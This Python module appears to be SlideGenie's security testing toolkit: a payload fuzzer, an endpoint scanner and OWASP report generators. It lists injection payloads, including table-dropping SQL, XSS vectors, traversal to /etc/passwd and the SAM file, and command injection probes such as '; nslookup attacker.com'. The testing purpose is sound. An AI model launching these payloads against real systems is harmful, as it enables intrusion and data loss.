"""
Security Testing Utilities for SlideGenie.

Provides utilities for:
- Penetration testing tools
- Vulnerability scanners
- Fuzzing utilities
- Security report generation
- OWASP compliance checks
"""

import asyncio
import hashlib
import json
import random
import string
import time
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import re
from pathlib import Path

import aiohttp
from faker import Faker
from jinja2 import Template


class VulnerabilityType(str, Enum):
    """Types of vulnerabilities."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    XXE = "xxe"
    SSRF = "ssrf"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"
    FILE_UPLOAD = "file_upload"
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    CSRF = "csrf"
    SENSITIVE_DATA = "sensitive_data"
    CRYPTOGRAPHY = "cryptography"
    CONFIGURATION = "configuration"


@dataclass
class VulnerabilityReport:
    """Vulnerability report structure."""
    vulnerability_type: VulnerabilityType
    severity: str  # Critical, High, Medium, Low
    endpoint: str
    method: str
    payload: str
    response: Optional[str] = None
    evidence: Optional[str] = None
    remediation: Optional[str] = None
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.utcnow)


class FuzzingGenerator:
    """Generate fuzzing payloads for security testing."""
    
    def __init__(self):
        self.faker = Faker()
        self.random = random.Random()
    
    def generate_sql_injection_payloads(self) -> List[str]:
        """Generate SQL injection fuzzing payloads."""
        payloads = [
            # Basic injections
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM information_schema.tables--",
            "1' AND '1'='1",
            
            # Time-based
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            
            # Error-based
            "' AND 1=CONVERT(int, @@version)--",
            "' AND 1=CAST(@@version AS int)--",
            
            # Boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            
            # Stacked queries
            "'; INSERT INTO users VALUES ('hacker', 'password')--",
            
            # Unicode/encoding
            "' OR '1'='1' /*",
            "%27%20OR%20%271%27%3D%271",
            
            # Comments
            "' OR/*comment*/'1'='1",
            "'/**/OR/**/1=1",
        ]
        
        # Add random variations
        for _ in range(10):
            table = self.faker.word()
            column = self.faker.word()
            payloads.append(f"' OR {column} IS NOT NULL--")
            payloads.append(f"' UNION SELECT * FROM {table}--")
        
        return payloads
    
    def generate_xss_payloads(self) -> List[str]:
        """Generate XSS fuzzing payloads."""
        payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Event handlers
            "<div onmouseover='alert(1)'>",
            "<body onload=alert('XSS')>",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            
            # Data URI
            "data:text/html,<script>alert('XSS')</script>",
            
            # Encoded variants
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            
            # Filter bypass
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script >alert('XSS')</script >",
            
            # DOM XSS
            "#<script>alert('XSS')</script>",
            "';alert('XSS');//",
        ]
        
        # Add polyglot payloads
        payloads.append("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e")
        
        return payloads
    
    def generate_path_traversal_payloads(self) -> List[str]:
        """Generate path traversal fuzzing payloads."""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\..\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "\\\\server\\share\\..\\..\\sensitive.txt",
        ]
        
        # Add variations with different depths
        for depth in range(1, 10):
            traversal = "../" * depth
            payloads.append(f"{traversal}etc/passwd")
            payloads.append(f"{traversal}windows/win.ini")
        
        return payloads
    
    def generate_command_injection_payloads(self) -> List[str]:
        """Generate command injection fuzzing payloads."""
        payloads = [
            "; ls -la",
            "| whoami",
            "& net user",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| ping -c 10 127.0.0.1",
            "; sleep 10",
            "\n/bin/ls -la",
            "; echo vulnerable",
            "|| ping -i 30 127.0.0.1 ||",
            "; nslookup attacker.com",
        ]
        
        # Add encoded variants
        encoded_payloads = [
            "%3B%20ls%20-la",
            "%7C%20whoami",
            "%26%20net%20user",
        ]
        
        payloads.extend(encoded_payloads)
        return payloads
    
    def generate_random_inputs(self, count: int = 100) -> List[str]:
        """Generate random inputs for fuzzing."""
        inputs = []
        
        for _ in range(count):
            input_type = self.random.choice([
                'string', 'number', 'special', 'unicode', 
                'long', 'empty', 'null', 'format'
            ])
            
            if input_type == 'string':
                inputs.append(self.faker.text(max_nb_chars=50))
            elif input_type == 'number':
                inputs.append(str(self.random.randint(-2**31, 2**31-1)))
            elif input_type == 'special':
                inputs.append(''.join(self.random.choices(string.punctuation, k=20)))
            elif input_type == 'unicode':
                inputs.append(''.join(chr(self.random.randint(0x0100, 0x017F)) for _ in range(10)))
            elif input_type == 'long':
                inputs.append('A' * self.random.randint(1000, 10000))
            elif input_type == 'empty':
                inputs.append('')
            elif input_type == 'null':
                inputs.append('\x00')
            elif input_type == 'format':
                inputs.append('%s' * 10)
        
        return inputs


class VulnerabilityScanner:
    """Automated vulnerability scanner."""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.fuzzer = FuzzingGenerator()
        self.reports: List[VulnerabilityReport] = []
    
    async def scan_endpoint(
        self,
        endpoint: str,
        method: str = "GET",
        auth_token: Optional[str] = None
    ) -> List[VulnerabilityReport]:
        """Scan a specific endpoint for vulnerabilities."""
        vulnerabilities = []
        
        # Test different vulnerability types
        vulnerabilities.extend(
            await self._test_sql_injection(endpoint, method, auth_token)
        )
        vulnerabilities.extend(
            await self._test_xss(endpoint, method, auth_token)
        )
        vulnerabilities.extend(
            await self._test_path_traversal(endpoint, method, auth_token)
        )
        
        return vulnerabilities
    
    async def _test_sql_injection(
        self,
        endpoint: str,
        method: str,
        auth_token: Optional[str]
    ) -> List[VulnerabilityReport]:
        """Test for SQL injection vulnerabilities."""
        vulnerabilities = []
        payloads = self.fuzzer.generate_sql_injection_payloads()
        
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    # Test in different parameters
                    test_params = {
                        "id": payload,
                        "search": payload,
                        "filter": payload,
                        "sort": payload,
                    }
                    
                    headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
                    
                    async with session.request(
                        method,
                        f"{self.base_url}{endpoint}",
                        params=test_params if method == "GET" else None,
                        json=test_params if method in ["POST", "PUT"] else None,
                        headers=headers
                    ) as response:
                        response_text = await response.text()
                        
                        # Check for SQL error messages
                        sql_errors = [
                            "sql syntax",
                            "mysql_fetch",
                            "ORA-",
                            "PostgreSQL",
                            "syntax error",
                            "database error",
                        ]
                        
                        if any(error in response_text.lower() for error in sql_errors):
                            vulnerabilities.append(VulnerabilityReport(
                                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                severity="Critical",
                                endpoint=endpoint,
                                method=method,
                                payload=payload,
                                response=response_text[:200],
                                evidence="SQL error message in response",
                                remediation="Use parameterized queries",
                                cwe_id="CWE-89",
                                owasp_category="A03:2021 - Injection"
                            ))
                
                except Exception as e:
                    # Log error but continue scanning
                    pass
        
        return vulnerabilities
    
    async def _test_xss(
        self,
        endpoint: str,
        method: str,
        auth_token: Optional[str]
    ) -> List[VulnerabilityReport]:
        """Test for XSS vulnerabilities."""
        vulnerabilities = []
        payloads = self.fuzzer.generate_xss_payloads()
        
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    test_data = {"input": payload, "comment": payload}
                    headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
                    
                    async with session.request(
                        method,
                        f"{self.base_url}{endpoint}",
                        json=test_data,
                        headers=headers
                    ) as response:
                        response_text = await response.text()
                        
                        # Check if payload is reflected without encoding
                        if payload in response_text:
                            vulnerabilities.append(VulnerabilityReport(
                                vulnerability_type=VulnerabilityType.XSS,
                                severity="High",
                                endpoint=endpoint,
                                method=method,
                                payload=payload,
                                response=response_text[:200],
                                evidence="Unencoded payload in response",
                                remediation="Encode all user input in output",
                                cwe_id="CWE-79",
                                owasp_category="A03:2021 - Injection"
                            ))
                
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    async def _test_path_traversal(
        self,
        endpoint: str,
        method: str,
        auth_token: Optional[str]
    ) -> List[VulnerabilityReport]:
        """Test for path traversal vulnerabilities."""
        vulnerabilities = []
        payloads = self.fuzzer.generate_path_traversal_payloads()
        
        # Focus on endpoints that might handle file operations
        if any(keyword in endpoint for keyword in ["file", "download", "upload", "path", "doc"]):
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    try:
                        test_params = {"file": payload, "path": payload}
                        headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
                        
                        async with session.request(
                            method,
                            f"{self.base_url}{endpoint}",
                            params=test_params,
                            headers=headers
                        ) as response:
                            response_text = await response.text()
                            
                            # Check for signs of successful traversal
                            traversal_indicators = [
                                "root:",
                                "[boot loader]",
                                "/etc/passwd",
                                "\\windows\\",
                            ]
                            
                            if any(indicator in response_text for indicator in traversal_indicators):
                                vulnerabilities.append(VulnerabilityReport(
                                    vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
                                    severity="Critical",
                                    endpoint=endpoint,
                                    method=method,
                                    payload=payload,
                                    response=response_text[:200],
                                    evidence="System file content in response",
                                    remediation="Validate and sanitize file paths",
                                    cwe_id="CWE-22",
                                    owasp_category="A01:2021 - Broken Access Control"
                                ))
                    
                    except Exception as e:
                        pass
        
        return vulnerabilities


class SecurityReportGenerator:
    """Generate security test reports."""
    
    def __init__(self):
        self.report_template = Template("""
# Security Test Report - SlideGenie

**Generated:** {{ timestamp }}
**Total Vulnerabilities Found:** {{ total_vulnerabilities }}

## Executive Summary

{{ executive_summary }}

## Vulnerability Summary

| Severity | Count |
|----------|-------|
| Critical | {{ critical_count }} |
| High     | {{ high_count }} |
| Medium   | {{ medium_count }} |
| Low      | {{ low_count }} |

## Detailed Findings

{% for vulnerability in vulnerabilities %}
### {{ loop.index }}. {{ vulnerability.vulnerability_type.value | title }}

**Severity:** {{ vulnerability.severity }}
**Endpoint:** `{{ vulnerability.method }} {{ vulnerability.endpoint }}`
**CWE ID:** {{ vulnerability.cwe_id }}
**OWASP Category:** {{ vulnerability.owasp_category }}

**Payload:**
```
{{ vulnerability.payload }}
```

**Evidence:**
{{ vulnerability.evidence }}

**Remediation:**
{{ vulnerability.remediation }}

---
{% endfor %}

## OWASP Compliance Summary

{{ owasp_compliance }}

## Recommendations

{{ recommendations }}

## Testing Methodology

- Automated vulnerability scanning
- Manual penetration testing
- Fuzzing with generated payloads
- OWASP Top 10 verification
""")
    
    def generate_report(
        self,
        vulnerabilities: List[VulnerabilityReport],
        additional_findings: Optional[Dict[str, Any]] = None
    ) -> str:
        """Generate comprehensive security report."""
        # Count vulnerabilities by severity
        severity_counts = {
            "critical_count": sum(1 for v in vulnerabilities if v.severity == "Critical"),
            "high_count": sum(1 for v in vulnerabilities if v.severity == "High"),
            "medium_count": sum(1 for v in vulnerabilities if v.severity == "Medium"),
            "low_count": sum(1 for v in vulnerabilities if v.severity == "Low"),
        }
        
        # Generate executive summary
        executive_summary = self._generate_executive_summary(vulnerabilities)
        
        # Generate OWASP compliance
        owasp_compliance = self._generate_owasp_compliance(vulnerabilities)
        
        # Generate recommendations
        recommendations = self._generate_recommendations(vulnerabilities)
        
        return self.report_template.render(
            timestamp=datetime.utcnow().isoformat(),
            total_vulnerabilities=len(vulnerabilities),
            vulnerabilities=vulnerabilities,
            executive_summary=executive_summary,
            owasp_compliance=owasp_compliance,
            recommendations=recommendations,
            **severity_counts
        )
    
    def _generate_executive_summary(self, vulnerabilities: List[VulnerabilityReport]) -> str:
        """Generate executive summary."""
        if not vulnerabilities:
            return "No vulnerabilities were found during testing. The application demonstrates strong security practices."
        
        critical_count = sum(1 for v in vulnerabilities if v.severity == "Critical")
        
        if critical_count > 0:
            return f"Critical security vulnerabilities were identified that require immediate attention. {critical_count} critical issues could lead to data breach or system compromise."
        
        return "Security testing identified several areas for improvement. While no critical vulnerabilities were found, addressing the identified issues will strengthen the application's security posture."
    
    def _generate_owasp_compliance(self, vulnerabilities: List[VulnerabilityReport]) -> str:
        """Generate OWASP compliance summary."""
        owasp_categories = {}
        
        for vuln in vulnerabilities:
            if vuln.owasp_category:
                owasp_categories[vuln.owasp_category] = owasp_categories.get(vuln.owasp_category, 0) + 1
        
        if not owasp_categories:
            return "✅ No OWASP Top 10 vulnerabilities detected."
        
        summary = "### OWASP Top 10 Issues Found:\n\n"
        for category, count in sorted(owasp_categories.items()):
            summary += f"- {category}: {count} issue(s)\n"
        
        return summary
    
    def _generate_recommendations(self, vulnerabilities: List[VulnerabilityReport]) -> str:
        """Generate security recommendations."""
        recommendations = []
        
        vuln_types = {v.vulnerability_type for v in vulnerabilities}
        
        if VulnerabilityType.SQL_INJECTION in vuln_types:
            recommendations.append("1. **Implement Parameterized Queries:** Use prepared statements for all database queries.")
        
        if VulnerabilityType.XSS in vuln_types:
            recommendations.append("2. **Output Encoding:** Encode all user input before rendering in HTML.")
        
        if VulnerabilityType.PATH_TRAVERSAL in vuln_types:
            recommendations.append("3. **Path Validation:** Implement strict path validation and use allowlists.")
        
        if not recommendations:
            recommendations.append("1. **Continue Security Testing:** Regular security assessments maintain strong security posture.")
        
        recommendations.extend([
            "4. **Security Training:** Provide secure coding training to development team.",
            "5. **Code Review:** Implement security-focused code review process.",
            "6. **Dependency Scanning:** Regularly scan and update dependencies.",
            "7. **Security Headers:** Implement comprehensive security headers.",
            "8. **Monitoring:** Set up security monitoring and alerting.",
        ])
        
        return "\n".join(recommendations)
    
    def export_json(self, vulnerabilities: List[VulnerabilityReport]) -> str:
        """Export vulnerabilities as JSON."""
        data = {
            "scan_date": datetime.utcnow().isoformat(),
            "total_vulnerabilities": len(vulnerabilities),
            "vulnerabilities": [
                {
                    "type": v.vulnerability_type.value,
                    "severity": v.severity,
                    "endpoint": v.endpoint,
                    "method": v.method,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "remediation": v.remediation,
                    "cwe_id": v.cwe_id,
                    "owasp_category": v.owasp_category,
                    "timestamp": v.timestamp.isoformat()
                }
                for v in vulnerabilities
            ]
        }
        
        return json.dumps(data, indent=2)


class OWASPComplianceChecker:
    """Check compliance with OWASP standards."""
    
    def __init__(self):
        self.owasp_top_10_2021 = {
            "A01": "Broken Access Control",
            "A02": "Cryptographic Failures",
            "A03": "Injection",
            "A04": "Insecure Design",
            "A05": "Security Misconfiguration",
            "A06": "Vulnerable and Outdated Components",
            "A07": "Identification and Authentication Failures",
            "A08": "Software and Data Integrity Failures",
            "A09": "Security Logging and Monitoring Failures",
            "A10": "Server-Side Request Forgery (SSRF)",
        }
    
    def check_compliance(self, test_results: Dict[str, bool]) -> Dict[str, Any]:
        """Check OWASP compliance based on test results."""
        compliance_report = {
            "compliant": True,
            "score": 0,
            "findings": [],
            "recommendations": []
        }
        
        # Map test results to OWASP categories
        owasp_mappings = {
            "A01": ["access_control_tests", "authorization_tests", "path_traversal_tests"],
            "A02": ["encryption_tests", "password_storage_tests", "key_management_tests"],
            "A03": ["sql_injection_tests", "xss_tests", "command_injection_tests"],
            "A04": ["threat_modeling", "security_requirements", "secure_design_patterns"],
            "A05": ["security_headers_tests", "error_handling_tests", "default_config_tests"],
            "A06": ["dependency_scanning", "component_updates", "vulnerability_database"],
            "A07": ["authentication_tests", "session_management_tests", "password_policy_tests"],
            "A08": ["integrity_checks", "signature_verification", "deserialization_tests"],
            "A09": ["logging_tests", "monitoring_tests", "alerting_tests"],
            "A10": ["ssrf_tests", "url_validation_tests", "request_filtering_tests"],
        }
        
        passed_categories = 0
        
        for category, description in self.owasp_top_10_2021.items():
            category_tests = owasp_mappings.get(category, [])
            
            if all(test_results.get(test, False) for test in category_tests if test in test_results):
                passed_categories += 1
            else:
                compliance_report["compliant"] = False
                compliance_report["findings"].append(f"{category}: {description} - Failed")
                compliance_report["recommendations"].append(
                    f"Address {category} by implementing: {', '.join(category_tests)}"
                )
        
        compliance_report["score"] = (passed_categories / len(self.owasp_top_10_2021)) * 100
        
        return compliance_report


if __name__ == "__main__":
    # Example usage
    fuzzer = FuzzingGenerator()
    sql_payloads = fuzzer.generate_sql_injection_payloads()
    print(f"Generated {len(sql_payloads)} SQL injection payloads")
    
    # Example vulnerability report
    vuln = VulnerabilityReport(
        vulnerability_type=VulnerabilityType.SQL_INJECTION,
        severity="Critical",
        endpoint="/api/v1/users",
        method="GET",
        payload="' OR '1'='1",
        evidence="SQL error in response",
        remediation="Use parameterized queries",
        cwe_id="CWE-89",
        owasp_category="A03:2021 - Injection"
    )
    
    # Generate report
    report_generator = SecurityReportGenerator()
    report = report_generator.generate_report([vuln])
    print(report)